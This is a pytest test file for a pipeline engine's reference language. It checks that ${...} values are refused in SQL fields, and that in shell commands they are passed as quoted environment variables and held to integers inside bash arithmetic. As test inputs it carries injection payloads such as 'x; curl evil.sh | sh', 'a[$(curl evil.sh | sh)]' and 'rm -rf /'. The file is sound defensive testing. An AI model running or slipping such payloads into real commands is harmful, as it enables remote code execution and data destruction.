"""Tests for the reference language: the whole of it, and nothing more."""

import subprocess
from datetime import UTC, datetime
from pathlib import Path
from typing import cast

import pytest

from dirigent_common import JsonMap
from dirigent_core.engine.references import (
    ReferenceScope,
    UnknownReference,
    has_reference,
    references_in,
    resolve,
    resolve_config,
    shell_unreadable,
)
from dirigent_core.ids import uuid7

RUN_ID = uuid7()


@pytest.fixture
def scope() -> ReferenceScope:
    """A scope with something in every namespace."""
    return ReferenceScope(
        params={"day": "2026-08-28", "regions": ["no", "se"], "count": 3, "nested": {"deep": {"x": 1}}},
        outputs={"fetch": {"status": 200, "body": {"id": "abc"}}, "list": [{"n": 1}, {"n": 2}]},
        item="oslo",
        has_item=True,
        scratch="file://artifacts/runs/1",
        artifacts="file://artifacts",
        run_id=RUN_ID,
    )


def test_a_whole_reference_keeps_its_type(scope: ReferenceScope) -> None:
    assert resolve("${params.count}", scope) == 3
    assert resolve("${params.regions}", scope) == ["no", "se"]
    assert resolve("${steps.fetch.output.status}", scope) == 200
    assert resolve("${steps.fetch.output.body}", scope) == {"id": "abc"}


def test_an_embedded_reference_interpolates_as_text(scope: ReferenceScope) -> None:
    assert resolve("/v1/ingest/${item}", scope) == "/v1/ingest/oslo"
    assert resolve("${params.day} has ${params.count}", scope) == "2026-08-28 has 3"


def test_a_value_with_no_reference_is_returned_unchanged(scope: ReferenceScope) -> None:
    assert resolve("plain", scope) == "plain"
    assert resolve(7, scope) == 7
    assert resolve(None, scope) is None
    assert resolve(True, scope) is True


def test_references_resolve_through_nested_structure(scope: ReferenceScope) -> None:
    resolved = resolve_config(
        {"headers": {"X-Day": "${params.day}"}, "body": ["${item}", {"n": "${params.count}"}]},
        scope,
    )
    assert resolved == {"headers": {"X-Day": "2026-08-28"}, "body": ["oslo", {"n": 3}]}


@pytest.mark.parametrize(
    "config",
    [
        {"sql": "SELECT * FROM t WHERE a = '${params.day}'"},
        {"sql": "${params.day}"},
        {"sql": ["SELECT 1", "DELETE FROM t WHERE a = ${item}"]},
    ],
    ids=["embedded", "whole", "list"],
)
def test_a_reference_in_a_sql_field_is_refused_and_not_spliced(scope: ReferenceScope, config: JsonMap) -> None:
    with pytest.raises(UnknownReference) as raised:
        resolve_config(config, scope, sql_fields={"sql"})
    assert raised.value.code == "reference.in_sql"
    assert raised.value.reference in ("params.day", "item")


def test_a_sql_field_keeps_its_escape_and_a_reference_beside_it_resolves(scope: ReferenceScope) -> None:
    resolved = resolve_config(
        {"sql": "SELECT '$${params.day}' WHERE a = :day", "params": {"day": "${params.day}"}},
        scope,
        sql_fields={"sql"},
    )
    assert resolved == {"sql": "SELECT '${params.day}' WHERE a = :day", "params": {"day": "2026-08-28"}}


def test_a_dotted_path_walks_objects_and_lists(scope: ReferenceScope) -> None:
    assert resolve("${params.nested.deep.x}", scope) == 1
    assert resolve("${steps.list.output.1.n}", scope) == 2


def test_the_run_namespace_exposes_scratch_and_id(scope: ReferenceScope) -> None:
    assert resolve("${run.scratch}/out.json", scope) == "file://artifacts/runs/1/out.json"
    assert resolve("${run.id}", scope) == str(RUN_ID)


def test_artifacts_names_the_storage_root_the_run_is_written_under(scope: ReferenceScope) -> None:
    assert resolve("${artifacts}", scope) == "file://artifacts"
    assert resolve("${artifacts}/kept/report.md", scope) == "file://artifacts/kept/report.md"


def test_artifacts_is_the_whole_reference_and_has_no_fields(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="artifacts is the storage root itself"):
        resolve("${artifacts.kept}", scope)


def test_a_boolean_interpolates_as_json_and_none_as_empty(scope: ReferenceScope) -> None:
    wide = ReferenceScope(params={"on": True, "off": False, "gap": None})
    assert resolve("v=${params.on},${params.off},${params.gap}", wide) == "v=true,false,"


def test_an_unknown_namespace_names_the_language(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="params, steps, item, run, and artifacts"):
        resolve("${secrets.token}", scope)


def test_an_unknown_parameter_says_what_exists(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="params has no 'missing'"):
        resolve("${params.missing}", scope)


def test_an_unknown_step_says_which_steps_have_output(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="step 'nope' has no stored output"):
        resolve("${steps.nope.output.x}", scope)


def test_a_step_reference_must_read_output(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="steps.<name>.output.<field>"):
        resolve("${steps.fetch.status}", scope)


def test_an_item_reference_outside_a_fan_out_step_is_refused() -> None:
    with pytest.raises(UnknownReference, match="does not fan out"):
        resolve("${item}", ReferenceScope())


def test_an_item_field_resolves_inside_a_mapped_object() -> None:
    scope = ReferenceScope(item={"code": "no", "name": "Norway"}, has_item=True)
    assert resolve("${item.code}", scope) == "no"
    with pytest.raises(UnknownReference, match="item has no 'nope'"):
        resolve("${item.nope}", scope)


def test_the_run_namespace_is_closed(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="run.scratch, run.id, run.window.start and run.window.end"):
        resolve("${run.pipeline}", scope)


def test_the_run_window_resolves_to_both_ends_as_iso_8601() -> None:
    windowed = ReferenceScope(
        window_start=datetime(2026, 1, 1, tzinfo=UTC),
        window_end=datetime(2026, 1, 2, tzinfo=UTC),
    )
    assert resolve("${run.window.start}", windowed) == "2026-01-01T00:00:00+00:00"
    assert resolve("${run.window.end}", windowed) == "2026-01-02T00:00:00+00:00"
    assert resolve("?from=${run.window.start}&to=${run.window.end}", windowed) == (
        "?from=2026-01-01T00:00:00+00:00&to=2026-01-02T00:00:00+00:00"
    )


def test_a_run_with_no_window_refuses_the_reference_and_says_it_carries_none(scope: ReferenceScope) -> None:
    for reference in ("${run.window.start}", "${run.window.end}"):
        with pytest.raises(UnknownReference, match="this run carries no window"):
            resolve(reference, scope)


def test_the_window_namespace_is_closed_at_its_two_edges() -> None:
    windowed = ReferenceScope(
        window_start=datetime(2026, 1, 1, tzinfo=UTC),
        window_end=datetime(2026, 1, 2, tzinfo=UTC),
    )
    with pytest.raises(UnknownReference, match="run exposes only"):
        resolve("${run.window}", windowed)
    with pytest.raises(UnknownReference, match="run exposes only"):
        resolve("${run.window.middle}", windowed)


def test_an_empty_reference_is_refused(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="names nothing"):
        resolve("${.}", scope)


def test_walking_into_a_scalar_says_so(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="it is not an object"):
        resolve("${params.count.nope}", scope)


def test_references_in_lists_every_reference_a_value_names() -> None:
    assert references_in({"a": "${params.x}", "b": ["${item}", 1], "c": 2}) == ["params.x", "item"]
    assert references_in("no references here") == []


def test_a_value_interpolated_into_a_shell_command_never_reaches_the_shells_parser() -> None:
    """The injection this closes is reachable by anyone who can POST to a webhook."""
    scope = ReferenceScope(params={"region": "x; curl evil.sh | sh"})
    resolved = resolve_config({"command": "load ${params.region}"}, scope, shell_fields={"command"})
    assert resolved["command"] == 'load "$DIRIGENT_V0"'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "x; curl evil.sh | sh"}


def test_a_reference_the_author_quoted_takes_no_quotes_of_its_own() -> None:
    """``echo "${x}"`` is what shell quoting could not close: there the quotes were the value's."""
    scope = ReferenceScope(params={"region": "$(id) two words"})
    resolved = resolve_config({"command": 'load "${params.region}"'}, scope, shell_fields={"command"})
    assert resolved["command"] == 'load "$DIRIGENT_V0"'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "$(id) two words"}


def test_a_reference_inside_the_authors_single_quotes_is_the_text_the_shell_says_it_is() -> None:
    """Single quotes are literal to a shell, and a shell that reads the text later finds it quoted."""
    scope = ReferenceScope(params={"region": "oslo"})
    resolved = resolve_config({"command": "load '${params.region}'"}, scope, shell_fields={"command"})
    assert resolved["command"] == "load '\"$DIRIGENT_V0\"'"
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("# don't\nrm ${params.x}", '# don\'t\nrm "$DIRIGENT_V0"'),
        ("# don't\nrm ${params.x}\n# won't", "# don't\nrm \"$DIRIGENT_V0\"\n# won't"),
        ('# say "hi\nrm ${params.x}', '# say "hi\nrm "$DIRIGENT_V0"'),
        ("true # don't\nrm ${params.x}", 'true # don\'t\nrm "$DIRIGENT_V0"'),
        ("echo a#b ${params.x}", 'echo a#b "$DIRIGENT_V0"'),
        ("echo \\# don't'; rm ${params.x}", "echo \\# don't'; rm \"$DIRIGENT_V0\""),
        ("echo $# ${params.x}", 'echo $# "$DIRIGENT_V0"'),
        ("echo $$ ${params.x}", 'echo $$ "$DIRIGENT_V0"'),
        ("cat <<EOF\nit's\nEOF\nrm ${params.x}", 'cat <<EOF\nit\'s\nEOF\nrm "$DIRIGENT_V0"'),
        ("cat <<EOF\nit's ${params.x}\nEOF", "cat <<EOF\nit's $DIRIGENT_V0\nEOF"),
        ("cat <<'EOF'\nit's\nEOF\nrm ${params.x}", "cat <<'EOF'\nit's\nEOF\nrm \"$DIRIGENT_V0\""),
        ("cat <<-EOF\n\tit's\n\tEOF\nrm ${params.x}", 'cat <<-EOF\n\tit\'s\n\tEOF\nrm "$DIRIGENT_V0"'),
        (
            "cat <<A <<B\nit's\nA\nsay \"hi\nB\nrm ${params.x}",
            'cat <<A <<B\nit\'s\nA\nsay "hi\nB\nrm "$DIRIGENT_V0"',
        ),
        ("cat <<EOF\n$(echo ${params.x})\nEOF", 'cat <<EOF\n$(echo "$DIRIGENT_V0")\nEOF'),
        ('a="$(cat <<EOF\nit\'s\nEOF\n)"; rm ${params.x}', 'a="$(cat <<EOF\nit\'s\nEOF\n)"; rm "$DIRIGENT_V0"'),
        ("cat <<<don\\'t; rm ${params.x}", 'cat <<<don\\\'t; rm "$DIRIGENT_V0"'),
        ("echo $'its' ${params.x}", "echo $'its' \"$DIRIGENT_V0\""),
        ('echo "$(case a in a) echo ${params.x};; esac)"', 'echo "$(case a in a) echo "$DIRIGENT_V0";; esac)"'),
    ],
    ids=[
        "comment-apostrophe",
        "comment-two-apostrophes",
        "comment-double-quote",
        "comment-after-a-command",
        "not-a-comment-inside-a-word",
        "not-a-comment-when-escaped",
        "special-argument-count",
        "special-pid",
        "here-document-before",
        "here-document-inside",
        "here-document-quoted",
        "here-document-stripping-tabs",
        "two-here-documents",
        "substitution-in-a-here-document",
        "here-document-in-a-substitution",
        "here-string",
        "ansi-quote",
        "case-in-a-quoted-substitution",
    ],
)
def test_what_a_shell_does_not_read_as_a_quote_leaves_a_reference_quoted(command: str, expected: str) -> None:
    resolved = resolve_config({"command": command}, ReferenceScope(params={"x": "a  b *"}), shell_fields={"command"})
    assert resolved["command"] == expected


@pytest.mark.parametrize("shell", ["/bin/dash", "/bin/bash"])
@pytest.mark.parametrize(
    "command",
    [
        "# don't\nprintf '[%s]\\n' ${params.x}",
        "# don't\nprintf '[%s]\\n' ${params.x}\n# won't",
        "# say \"hi\nprintf '[%s]\\n' ${params.x}",
        "true <<EOF\nit's\nEOF\nprintf '[%s]\\n' ${params.x}",
        "true <<'EOF'\nit's \"\nEOF\nprintf '[%s]\\n' ${params.x}",
        "printf '[%s]\\n' \"$(printf %s ${params.x})\"",
        "printf '[%s]\\n' \"${params.x}\"",
    ],
    ids=["apostrophe", "two-apostrophes", "double-quote", "here-document", "quoted-here", "substitution", "quoted"],
)
def test_a_value_stays_one_word_under_each_shell(shell: str, command: str) -> None:
    """The value holds spaces and a glob, either of which would split it if it were written bare."""
    if not Path(shell).exists():
        pytest.skip(f"{shell} is not on this machine")
    resolved = resolve_config({"command": command}, ReferenceScope(params={"x": "a  b *"}), shell_fields={"command"})
    variables = cast("dict[str, str]", resolved["shell_variables"])
    finished = subprocess.run(  # noqa: S603 - a fixed command, built above from literals
        [shell, "-c", cast("str", resolved["command"])], env=variables, capture_output=True, check=True
    )
    assert finished.stdout == b"[a  b *]\n"


@pytest.mark.parametrize(
    ("command", "opener", "line"),
    [
        ("echo 'open ${params.x}", "'", 1),
        ('echo "open ${params.x}', '"', 1),
        ("echo $(open ${params.x}", "$(", 1),
        ("echo `open ${params.x}", "`", 1),
        ("echo ${params.x} ${open", "${", 1),
        ("true\necho '${params.x}", "'", 2),
        ("cat <<EOF\nnever closed ${params.x}\n", "<<EOF", 1),
        ('cat <<"${params.x}"\nhi\n', "<<", 1),
        ("echo $'it\\'s' ${params.x}", "$'", 1),
        ("echo \\${params.x}", "\\", 1),
        ("[[ -f a && ${params.x}", "[[", 1),
    ],
)
def test_a_command_with_a_reference_that_cannot_be_read_is_refused(command: str, opener: str, line: int) -> None:
    with pytest.raises(UnknownReference) as raised:
        resolve_config({"command": command}, ReferenceScope(params={"x": "oslo"}), shell_fields={"command"})
    assert raised.value.code == "reference.shell_unreadable"
    assert raised.value.params["opener"] == opener
    assert raised.value.params["line"] == line


@pytest.mark.parametrize("command", ["echo 'open", "cat <<EOF\nnever closed", "echo $(open"])
def test_a_command_with_no_reference_is_not_read_at_all(command: str) -> None:
    resolved = resolve_config({"command": command}, ReferenceScope(), shell_fields={"command"})
    assert resolved["command"] == command


def test_an_unknown_reference_is_refused_as_that_before_the_command_is_called_unreadable() -> None:
    with pytest.raises(UnknownReference) as raised:
        resolve_config({"command": "echo 'open ${params.nope}"}, ReferenceScope(params={}), shell_fields={"command"})
    assert raised.value.code != "reference.shell_unreadable"


@pytest.mark.parametrize(
    "command",
    [
        "[[ ${params.x} -eq 1 ]]",
        '[[ 1 -lt "${params.x}" ]]',
        "[[ -f f && ${params.x} -ge 2 ]]",
        "[[ -v ${params.x} ]]",
        "[[ $(cat ${params.x}) -gt 1 ]]",
        "let y=${params.x}",
        'let "y=${params.x}"',
        "let y=1 z=${params.x}",
        "if true; then let y=${params.x}; fi",
        "(let y=${params.x})",
        "echo $(let y=${params.x})",
        "command let y=${params.x}",
        "[[ a == a ]]&& let y=${params.x}",
        "a[1]=x let y=${params.x}",
        "A=1 let y=${params.x}",
        "declare -i y=${params.x}",
        "typeset -i y=${params.x}",
        "local -ix y=${params.x}",
        "declare -i y; y=${params.x}",
        "y=${params.x}; declare -i y",
        "declare ${params.x}=1",
        "export ${params.x}",
        "a[${params.x}]=1",
        "a[${params.x}]+=1",
        "echo ${a[${params.x}]}",
        'echo "${a[${params.x}]}"',
        "echo ${#a[${params.x}]}",
        "unset a[${params.x}]",
        'unset "a[${params.x}]"',
        "echo ${s:${params.x}}",
        'echo "${s:${params.x}}"',
        "echo ${s: ${params.x}}",
        "echo ${s:1:${params.x}}",
        "echo ${a[@]:${params.x}}",
        "echo ${1:${params.x}}",
        # A quote a shell does not read, before each spelling.
        "# don't\nlet y=${params.x}",
        "# don't\n[[ ${params.x} -eq 1 ]]",
        "# don't\necho ${s:${params.x}}",
    ],
)
def test_a_reference_bash_evaluates_some_other_way_refuses_what_is_not_an_integer(command: str) -> None:
    scope = ReferenceScope(params={"x": "a[$(curl evil.sh | sh)]"})
    with pytest.raises(UnknownReference, match="shell arithmetic"):
        resolve_config({"command": command}, scope, shell_fields={"command"})


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("let y=${params.x}; echo $y", "3"),
        ('let "y=${params.x} + 1"; echo $y', "4"),
        ("declare -i y=${params.x}; echo $y", "3"),
        ("declare -i y; y=${params.x}; echo $y", "3"),
        ("[[ ${params.x} -eq 3 ]] && echo yes", "yes"),
        ('[[ "${params.x}" -eq 3 ]] && echo yes', "yes"),
        ("a[${params.x}]=z; echo $${a[3]}", "z"),
        ("a[3]=z; echo ${a[${params.x}]}", "z"),
        ("s=abcdef; echo ${s:${params.x}}", "def"),
        ('s=abcdef; echo "${s:1:${params.x}}"', "bcd"),
    ],
)
def test_an_integer_still_runs_where_bash_evaluates_it(command: str, expected: str) -> None:
    resolved = resolve_config({"command": command}, ReferenceScope(params={"x": 3}), shell_fields={"command"})
    variables = cast("dict[str, str]", resolved["shell_variables"])
    finished = subprocess.run(  # noqa: S603 - a fixed command, built above from literals
        ["/bin/bash", "-c", cast("str", resolved["command"])], env=variables, capture_output=True, check=True
    )
    assert finished.stdout.decode().strip() == expected


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("[[ ${params.x} == a ]]", '[[ "$DIRIGENT_V0" == a ]]'),
        ("[[ ${params.x} == a && 1 -eq 1 ]]", '[[ "$DIRIGENT_V0" == a && 1 -eq 1 ]]'),
        ("[ ${params.x} -eq 1 ]", '[ "$DIRIGENT_V0" -eq 1 ]'),
        ("test ${params.x} -eq 1", 'test "$DIRIGENT_V0" -eq 1'),
        ("echo let ${params.x}", 'echo let "$DIRIGENT_V0"'),
        ('echo "let me ${params.x}"', 'echo "let me $DIRIGENT_V0"'),
        ("let y=1; echo ${params.x}", 'let y=1; echo "$DIRIGENT_V0"'),
        ("let y=1\necho ${params.x}", 'let y=1\necho "$DIRIGENT_V0"'),
        ("declare y=${params.x}", 'declare y="$DIRIGENT_V0"'),
        ("export Y=${params.x}", 'export Y="$DIRIGENT_V0"'),
        ("echo a[${params.x}]", 'echo a["$DIRIGENT_V0"]'),
        ('echo "a[${params.x}]=1"', 'echo "a[$DIRIGENT_V0]=1"'),
        ("declare -A m; m[${params.x}]=1", 'declare -A m; m["$DIRIGENT_V0"]=1'),
        ("declare -A m; echo ${m[${params.x}]}", 'declare -A m; echo ${m["$DIRIGENT_V0"]}'),
        ("echo ${s:-${params.x}}", 'echo ${s:-"$DIRIGENT_V0"}'),
        ("echo ${s:=${params.x}}", 'echo ${s:="$DIRIGENT_V0"}'),
        ("echo ${s%${params.x}}", 'echo ${s%"$DIRIGENT_V0"}'),
        ('echo "${s:-${params.x}}"', 'echo "${s:-$DIRIGENT_V0}"'),
        ("echo $${a[@]} ${params.x}", 'echo ${a[@]} "$DIRIGENT_V0"'),
    ],
)
def test_a_reference_bash_does_not_evaluate_takes_any_value(command: str, expected: str) -> None:
    scope = ReferenceScope(params={"x": "a b"})
    resolved = resolve_config({"command": command}, scope, shell_fields={"command"})
    assert resolved["command"] == expected


def test_only_a_command_holding_a_reference_is_called_unreadable() -> None:
    assert shell_unreadable("echo '${params.x}") is not None
    assert shell_unreadable("echo '${params.x}'") is None
    assert shell_unreadable("echo 'open") is None


def test_the_quoting_a_reference_lands_in_is_read_through_escapes_and_nesting() -> None:
    """Every form a command writes quotes in, so a value keeps its word boundaries in each."""
    scope = ReferenceScope(params={"x": "a b"})
    commands = {
        'echo \\"${params.x}': 'echo \\""$DIRIGENT_V0"',
        'echo "it\\"${params.x}"': 'echo "it\\"$DIRIGENT_V0"',
        'echo "$(cat "${params.x}")"': 'echo "$(cat "$DIRIGENT_V0")"',
        'echo "$(cat ${params.x})"': 'echo "$(cat "$DIRIGENT_V0")"',
        "echo `cat ${params.x}`": 'echo `cat "$DIRIGENT_V0"`',
        "echo 'it'${params.x}": "echo 'it'\"$DIRIGENT_V0\"",
    }
    for command, expected in commands.items():
        assert resolve_config({"command": command}, scope, shell_fields={"command"})["command"] == expected


@pytest.mark.parametrize(
    "command",
    [
        "echo $(( ${params.x} + 1 ))",
        'echo $(( "${params.x}" + 1 ))',
        "echo $(( (1 + (${params.x})) * 2 ))",
        "(( ${params.x} > 1 ))",
        "echo $[ ${params.x} + 1 ]",
        'echo "total: $(( ${params.x} ))"',
        "echo $(( $(( ${params.x} )) ))",
        "echo $(( $(cat ${params.x}) + 1 ))",
        "echo $(( ((1) + 2) + ${params.x} ))",
        "echo $[ a[1] + ${params.x} ]",
        # A quote the tracker reads and the shell does not, before each spelling.
        "# don't stop\necho $(( ${params.x} + 1 ))",
        "# don't stop\n(( ${params.x} )); echo done",
        "# don't stop\necho $[ ${params.x} + 1 ]",
        '# say "when\n(( ${params.x} )); echo done',
        '# say "when\necho $(( ${params.x} + 1 ))',
        "cat <<EOF\nit's here\nEOF\necho $(( ${params.x} + 1 ))",
        "cat <<EOF\nit's here\nEOF\n(( ${params.x} )); echo done",
        "echo $'it\\'s'; echo $(( ${params.x} + 1 ))",
        "echo $'it\\'s'; (( ${params.x} )); echo done",
        # A quote before the opener that a shell does read.
        "echo 'it'\"s\"; echo $(( ${params.x} + 1 ))",
        # A literal opener reads as one, which is the cost of reading no quote.
        "echo '$(( ' ${params.x}",
    ],
)
def test_a_reference_in_shell_arithmetic_refuses_what_a_shell_would_evaluate(command: str) -> None:
    """Bash evaluates a value in arithmetic, and a subscript in it runs a command."""
    scope = ReferenceScope(params={"x": "a[$(curl evil.sh | sh)]"})
    with pytest.raises(UnknownReference, match="shell arithmetic"):
        resolve_config({"command": command}, scope, shell_fields={"command"})


@pytest.mark.parametrize("shell", ["/bin/dash", "/bin/bash"])
@pytest.mark.parametrize(
    "command",
    [
        "# don't stop\necho $(( ${params.x} + 1 ))",
        '# say "when\necho $(( ${params.x} + 1 ))',
        "cat <<EOF\nit's here\nEOF\necho $(( ${params.x} + 1 ))",
    ],
    ids=["comment-apostrophe", "comment-double-quote", "here-document"],
)
def test_an_integer_after_a_misread_quote_runs_under_each_shell(shell: str, command: str) -> None:
    if not Path(shell).exists():
        pytest.skip(f"{shell} is not on this machine")
    scope = ReferenceScope(params={"x": 3})
    resolved = resolve_config({"command": command}, scope, shell_fields={"command"})
    variables = cast("dict[str, str]", resolved["shell_variables"])
    finished = subprocess.run(  # noqa: S603 - a fixed command, built above from literals
        [shell, "-c", cast("str", resolved["command"])], env=variables, capture_output=True, check=True
    )
    assert finished.stdout.decode().splitlines()[-1] == "4"


@pytest.mark.parametrize("value", [3, -3, "3", "-3"])
def test_a_reference_in_shell_arithmetic_resolves_to_an_integer(value: int | str) -> None:
    """The form stays usable, and bare, because dash refuses a quote inside arithmetic."""
    scope = ReferenceScope(params={"x": value})
    resolved = resolve_config({"command": "echo $(( ${params.x} + 1 ))"}, scope, shell_fields={"command"})
    assert resolved["command"] == "echo $(( $DIRIGENT_V0 + 1 ))"
    assert resolved["shell_variables"] == {"DIRIGENT_V0": str(value)}


def test_quotes_the_author_wrote_inside_arithmetic_stay_theirs() -> None:
    """A reference takes none of its own there, and what was typed is left as typed."""
    scope = ReferenceScope(params={"x": 3})
    resolved = resolve_config({"command": 'echo $(( "${params.x}" + 1 ))'}, scope, shell_fields={"command"})
    assert resolved["command"] == 'echo $(( "$DIRIGENT_V0" + 1 ))'


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("echo $(( 1 + 1 )) ${params.x}", 'echo $(( 1 + 1 )) "$DIRIGENT_V0"'),
        ("echo $(( (1 + 1) )) ${params.x}", 'echo $(( (1 + 1) )) "$DIRIGENT_V0"'),
        ("echo $[ 1 + 1 ] ${params.x}", 'echo $[ 1 + 1 ] "$DIRIGENT_V0"'),
        ("(( 1 > 0 )) && echo ${params.x}", '(( 1 > 0 )) && echo "$DIRIGENT_V0"'),
        ("echo $(cat ${params.x})", 'echo $(cat "$DIRIGENT_V0")'),
        ("(cd /tmp; echo ${params.x})", '(cd /tmp; echo "$DIRIGENT_V0")'),
        ("echo '$(( 1 ))' ${params.x}", "echo '$(( 1 ))' \"$DIRIGENT_V0\""),
        ("jq '((.a // 0) + 1)' ${params.x}", "jq '((.a // 0) + 1)' \"$DIRIGENT_V0\""),
        ("jq '((.a // []) | length) as $n | $n' ${params.x}", "jq '((.a // []) | length) as $n | $n' \"$DIRIGENT_V0\""),
    ],
)
def test_a_reference_beside_shell_arithmetic_takes_any_value(command: str, expected: str) -> None:
    """Only arithmetic itself is held to an integer: a value elsewhere is never re-read."""
    scope = ReferenceScope(params={"x": "a b"})
    resolved = resolve_config({"command": command}, scope, shell_fields={"command"})
    assert resolved["command"] == expected
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "a b"}


def test_a_rewritten_arithmetic_command_runs_in_the_shell_a_command_is_handed_to() -> None:
    """The bare spelling is what makes it valid in dash as well as in bash."""
    resolved = resolve_config(
        {"command": "echo $(( ${params.x} + ${params.x} ))"},
        ReferenceScope(params={"x": 20}),
        shell_fields={"command"},
    )
    variables = cast("dict[str, str]", resolved["shell_variables"])
    finished = subprocess.run(  # noqa: S603 - a fixed command, built above from literals
        ["/bin/sh", "-c", cast("str", resolved["command"])], env=variables, capture_output=True, check=True
    )
    assert finished.stdout == b"40\n"


def test_each_reference_in_a_command_gets_a_variable_of_its_own() -> None:
    scope = ReferenceScope(params={"region": "oslo", "day": "2026-08-28"})
    resolved = resolve_config(
        {"command": "load ${params.region} ${params.day} ${params.region}"}, scope, shell_fields={"command"}
    )
    assert resolved["command"] == 'load "$DIRIGENT_V0" "$DIRIGENT_V1" "$DIRIGENT_V2"'
    assert resolved["shell_variables"] == {
        "DIRIGENT_V0": "oslo",
        "DIRIGENT_V1": "2026-08-28",
        "DIRIGENT_V2": "oslo",
    }


def test_substitution_leaves_the_metacharacters_the_author_typed_alone() -> None:
    """A pipe the pipeline author wrote is the reason the shell form exists at all."""
    scope = ReferenceScope(params={"name": "oslo"})
    resolved = resolve_config({"command": "cat ${params.name}.csv | wc -l"}, scope, shell_fields={"command"})
    assert resolved["command"] == 'cat "$DIRIGENT_V0".csv | wc -l'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}


def test_a_command_that_is_entirely_a_reference_is_one_word_and_not_a_program() -> None:
    """Otherwise a parameter is not an argument to a program, it *is* the program."""
    scope = ReferenceScope(params={"cmd": "rm -rf /"})
    resolved = resolve_config({"command": "${params.cmd}"}, scope, shell_fields={"command"})
    assert resolved["command"] == '"$DIRIGENT_V0"'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "rm -rf /"}


def test_only_the_fields_the_block_marked_are_rewritten() -> None:
    """Rewriting a value that is not going to a shell would corrupt it."""
    scope = ReferenceScope(params={"region": "a b"})
    resolved = resolve_config(
        {"command": "echo ${params.region}", "argv": ["echo", "${params.region}"], "cwd": "${params.region}"},
        scope,
        shell_fields={"command"},
    )
    assert resolved["command"] == 'echo "$DIRIGENT_V0"'
    assert resolved["argv"] == ["echo", "a b"]
    assert resolved["cwd"] == "a b"
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "a b"}


def test_nothing_is_rewritten_and_no_variables_are_carried_when_no_field_was_marked(scope: ReferenceScope) -> None:
    resolved = resolve_config({"command": "echo ${item}"}, scope)
    assert resolved == {"command": "echo oslo"}


def test_a_document_cannot_carry_its_own_shell_variables(scope: ReferenceScope) -> None:
    """Whatever a stored document put there, the resolution is what the block is handed."""
    resolved = resolve_config(
        {"command": "echo ${item}", "shell_variables": {"DIRIGENT_V0": "mine"}}, scope, shell_fields={"command"}
    )
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}


def test_an_escaped_reference_yields_the_literal_braces(scope: ReferenceScope) -> None:
    """The escape is what lets a compose file or a template carry its own braces through."""
    assert resolve("$${GREETING}", scope) == "${GREETING}"
    assert resolve("echo $${HOME} to ${item}", scope) == "echo ${HOME} to oslo"
    assert resolve("$${params.day}", scope) == "${params.day}"


def test_an_escaped_reference_is_never_looked_up(scope: ReferenceScope) -> None:
    assert resolve("$${params.missing}", scope) == "${params.missing}"
    assert resolve("$${secrets.token}", scope) == "${secrets.token}"


def test_a_double_dollar_with_no_brace_is_left_alone(scope: ReferenceScope) -> None:
    """A shell command's $$ is the process id, and nothing here may touch it."""
    assert resolve("echo $$", scope) == "echo $$"
    assert resolve("pid=$$ day=${params.day}", scope) == "pid=$$ day=2026-08-28"
    assert resolve("$$HOME", scope) == "$$HOME"


def test_a_triple_dollar_is_an_escaped_dollar_before_a_reference(scope: ReferenceScope) -> None:
    """The dollars collapse in pairs, so the odd one left over still starts a reference."""
    assert resolve("$$${item}", scope) == "$oslo"
    assert resolve("$$$${item}", scope) == "$${item}"


def test_an_escaped_reference_is_text_even_when_it_is_the_whole_value(scope: ReferenceScope) -> None:
    assert resolve("$${params.count}", scope) == "${params.count}"


def test_an_escaped_reference_reaches_a_shell_as_the_text_it_is(scope: ReferenceScope) -> None:
    """It is text the author typed, so it keeps its meaning to the shell like any other."""
    resolved = resolve_config({"command": "echo $${HOME} ${item}"}, scope, shell_fields={"command"})
    assert resolved["command"] == 'echo ${HOME} "$DIRIGENT_V0"'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}


def test_an_escaped_reference_is_not_a_reference_the_document_names(scope: ReferenceScope) -> None:
    assert references_in({"a": "$${params.x}", "b": "${item}", "c": "$$${params.day}"}) == ["item", "params.day"]
    assert has_reference("$${params.x}") is False
    assert has_reference("${params.x}") is True
    assert has_reference("$$") is False


def test_everything_that_resolved_before_the_escape_resolves_identically(scope: ReferenceScope) -> None:
    """A corpus of today's forms, so the escape can only ever add spellings."""
    assert resolve("${params.count}", scope) == 3
    assert resolve("${params.regions}", scope) == ["no", "se"]
    assert resolve(" ${params.count} ", scope) == " 3 "
    assert resolve("${ params.count }", scope) == 3
    assert resolve("${steps.fetch.output.body}", scope) == {"id": "abc"}
    assert resolve("${steps.list.output.1.n}", scope) == 2
    assert resolve("/v1/ingest/${item}", scope) == "/v1/ingest/oslo"
    assert resolve("${params.day} has ${params.count}", scope) == "2026-08-28 has 3"
    assert resolve("${run.scratch}/out.json", scope) == "file://artifacts/runs/1/out.json"
    assert resolve({"a": ["${item}", 1], "b": {"c": "${params.day}"}}, scope) == {
        "a": ["oslo", 1],
        "b": {"c": "2026-08-28"},
    }
    assert resolve("$5 and 100%", scope) == "$5 and 100%"
    assert resolve("{not a reference}", scope) == "{not a reference}"
    shell = resolve_config({"command": "echo ${item}"}, scope, shell_fields={"command"})
    assert shell["command"] == 'echo "$DIRIGENT_V0"'


@pytest.fixture
def paired_scope() -> ReferenceScope:
    """A scope for an item of a step that maps over another fan-out's grid."""
    return ReferenceScope(
        item="oslo",
        has_item=True,
        item_index=1,
        grids={"spread": ["bergen", "oslo"]},
        item_outputs={"spread": {"path": "s3://bucket/oslo.json"}},
        paired=frozenset({"spread"}),
    )


